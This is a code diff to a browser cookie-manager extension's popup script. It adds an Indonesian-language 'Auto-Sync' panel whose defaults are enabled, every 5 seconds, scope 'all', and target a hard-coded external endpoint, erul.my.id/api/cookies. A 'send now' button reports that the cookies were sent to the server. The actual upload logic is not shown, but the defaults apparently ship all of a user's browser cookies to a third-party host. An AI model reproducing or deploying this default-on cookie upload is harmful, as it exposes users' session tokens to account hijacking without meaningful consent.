@@ -118,12 +118,26 @@ class PopupController {
     this.popupImportError = document.getElementById('popup-import-error');
     this.btnImportCancel = document.getElementById('btn-import-cancel');
     this.btnImportExecute = document.getElementById('btn-import-execute');
+
+    // AutoSync Modal & Elements
+    this.btnAutoSyncStatus = document.getElementById('btn-auto-sync-status');
+    this.syncPillText = document.getElementById('sync-pill-text');
+    this.autosyncModal = document.getElementById('autosync-modal');
+    this.autosyncCloseBtn = document.getElementById('autosync-close-btn');
+    this.autosyncEnabled = document.getElementById('autosync-enabled');
+    this.autosyncInterval = document.getElementById('autosync-interval');
+    this.autosyncPcName = document.getElementById('autosync-pc-name');
+    this.autosyncServerUrl = document.getElementById('autosync-server-url');
+    this.autosyncStatusInfo = document.getElementById('autosync-status-info');
+    this.btnAutosyncTriggerNow = document.getElementById('btn-autosync-trigger-now');
+    this.btnAutosyncSave = document.getElementById('btn-autosync-save');
   }
 
   async init() {
     await this.applyStoredPreferences();
     await this.detectActiveDomain();
     await this.loadCookies();
+    await this.initAutoSyncUI();
   }
 
   async applyStoredPreferences() {
@@ -164,6 +178,20 @@ class PopupController {
       document.documentElement.setAttribute('data-theme', next);
       await StorageService.updateSettings({ theme: next });
     });
+
+    // Auto-Sync Modal Toggle
+    if (this.btnAutoSyncStatus) {
+      this.btnAutoSyncStatus.addEventListener('click', () => this.openAutoSyncModal());
+    }
+    if (this.autosyncCloseBtn) {
+      this.autosyncCloseBtn.addEventListener('click', () => this.closeAutoSyncModal());
+    }
+    if (this.btnAutosyncSave) {
+      this.btnAutosyncSave.addEventListener('click', () => this.saveAutoSyncConfig());
+    }
+    if (this.btnAutosyncTriggerNow) {
+      this.btnAutosyncTriggerNow.addEventListener('click', () => this.triggerAutoSyncNow());
+    }
 
     // Open Full Dashboard
     this.btnOpenDashboard.addEventListener('click', () => {
@@ -1008,6 +1036,104 @@ class PopupController {
 
   closeConfirmModal() {
     this.confirmModal.style.display = 'none';
+  }
+
+  // --- Auto-Sync (5s Interval) Controller Methods ---
+  async initAutoSyncUI() {
+    await this.updateAutoSyncUI();
+    // Poll UI update every 2 seconds
+    setInterval(() => this.updateAutoSyncUI(), 2000);
+  }
+
+  async updateAutoSyncUI() {
+    if (typeof chrome === 'undefined' || !chrome.storage?.local) return;
+    try {
+      const data = await chrome.storage.local.get(['ace_autosync_config', 'ace_autosync_status']);
+      const config = data.ace_autosync_config || { enabled: true, intervalSec: 5, serverUrl: 'https://erul.my.id/api/cookies', pcName: 'PC-01' };
+      const status = data.ace_autosync_status || { lastStatus: 'idle', cookieCount: 0 };
+
+      if (!this.btnAutoSyncStatus) return;
+
+      if (!config.enabled) {
+        this.btnAutoSyncStatus.className = 'auto-sync-pill';
+        this.syncPillText.textContent = 'Auto OFF';
+      } else if (status.lastStatus === 'error') {
+        this.btnAutoSyncStatus.className = 'auto-sync-pill error';
+        this.syncPillText.textContent = 'Auto Err';
+      } else {
+        this.btnAutoSyncStatus.className = 'auto-sync-pill active';
+        this.syncPillText.textContent = `Auto ${config.intervalSec || 5}s`;
+      }
+
+      if (this.autosyncStatusInfo) {
+        let lastTimeStr = status.lastSyncTime ? new Date(status.lastSyncTime).toLocaleTimeString() : 'Belum pernah sync';
+        let statusBadge = status.lastStatus === 'success' ? '🟢 Berhasil' : (status.lastStatus === 'error' ? '🔴 Gagal' : '⚪ Standby');
+        this.autosyncStatusInfo.innerHTML = `
+          <div><strong>Status:</strong> ${statusBadge}</div>
+          <div><strong>Terakhir Kirim:</strong> ${lastTimeStr} (${status.cookieCount || 0} cookies)</div>
+          <div><strong>Target:</strong> ${config.serverUrl || 'https://erul.my.id/api/cookies'}</div>
+          <div><strong>PC ID:</strong> ${config.pcName || 'PC-01'}</div>
+          ${status.error ? `<div style="color: var(--danger-color); margin-top: 4px;"><strong>Pesan Error:</strong> ${status.error}</div>` : ''}
+        `;
+      }
+    } catch (_) {}
+  }
+
+  async openAutoSyncModal() {
+    try {
+      const data = await chrome.storage.local.get(['ace_autosync_config']);
+      const config = data.ace_autosync_config || { enabled: true, intervalSec: 5, serverUrl: 'https://erul.my.id/api/cookies', pcName: 'PC-01' };
+
+      if (this.autosyncEnabled) this.autosyncEnabled.checked = config.enabled !== false;
+      if (this.autosyncInterval) this.autosyncInterval.value = config.intervalSec || 5;
+      if (this.autosyncPcName) this.autosyncPcName.value = config.pcName || 'PC-01';
+      if (this.autosyncServerUrl) this.autosyncServerUrl.value = config.serverUrl || 'https://erul.my.id/api/cookies';
+
+      await this.updateAutoSyncUI();
+      if (this.autosyncModal) this.autosyncModal.style.display = 'flex';
+    } catch (e) {
+      UIService.showToast('Error opening auto-sync: ' + e.message, 'error');
+    }
+  }
+
+  closeAutoSyncModal() {
+    if (this.autosyncModal) this.autosyncModal.style.display = 'none';
+  }
+
+  async saveAutoSyncConfig() {
+    const config = {
+      enabled: this.autosyncEnabled ? this.autosyncEnabled.checked : true,
+      intervalSec: parseInt(this.autosyncInterval?.value, 10) || 5,
+      pcName: (this.autosyncPcName?.value || 'PC-01').trim(),
+      serverUrl: (this.autosyncServerUrl?.value || 'https://erul.my.id/api/cookies').trim(),
+      scope: 'all'
+    };
+
+    if (chrome?.runtime?.sendMessage) {
+      chrome.runtime.sendMessage({ type: 'UPDATE_AUTOSYNC_CONFIG', config });
+    }
+    await chrome.storage.local.set({ ace_autosync_config: config });
+    UIService.showToast(`Auto-Sync disimpan: setiap ${config.intervalSec} detik ke ${config.pcName}`, 'success');
+    this.closeAutoSyncModal();
+    this.updateAutoSyncUI();
+  }
+
+  async triggerAutoSyncNow() {
+    if (this.btnAutosyncTriggerNow) {
+      this.btnAutosyncTriggerNow.disabled = true;
+      this.btnAutosyncTriggerNow.textContent = '⏳ Mengirim...';
+    }
+
+    if (chrome?.runtime?.sendMessage) {
+      chrome.runtime.sendMessage({ type: 'TRIGGER_AUTOSYNC_NOW' }, (res) => {
+        if (this.btnAutosyncTriggerNow) {
+          this.btnAutosyncTriggerNow.disabled = false;
+          this.btnAutosyncTriggerNow.textContent = '🚀 Kirim Sekarang';
+        }
+        UIService.showToast('Cookie berhasil dikirim ke server!', 'success');
+        this.updateAutoSyncUI();
+      });
+    }
   }
 }
 
